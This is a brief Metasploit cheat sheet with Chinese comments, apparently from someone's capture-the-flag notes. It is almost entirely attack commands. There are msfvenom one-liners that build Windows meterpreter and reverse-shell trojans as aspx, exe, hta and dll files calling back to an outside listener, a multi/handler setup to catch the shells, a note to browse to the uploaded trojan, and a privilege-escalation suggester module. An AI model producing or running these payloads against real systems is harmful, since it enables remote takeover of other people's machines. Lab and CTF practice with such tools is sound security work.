# Metasploit



```shell
search
set
exploit
show options
check
```

创建马：

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=39502 -f aspx > msfshell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f exe > '/Users/feng/many-ctf/Ma!/msfshell.exe'

msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.14 lport=39502 -f hta-psh -o msfv.hta

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > msf-reverse-shell-39502.dll
```

```shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.28
set lport 39502
exploit
访问传上去的木马即可
```





提权建议脚本：

```shell
post/multi/recon/local_exploit_suggester
```

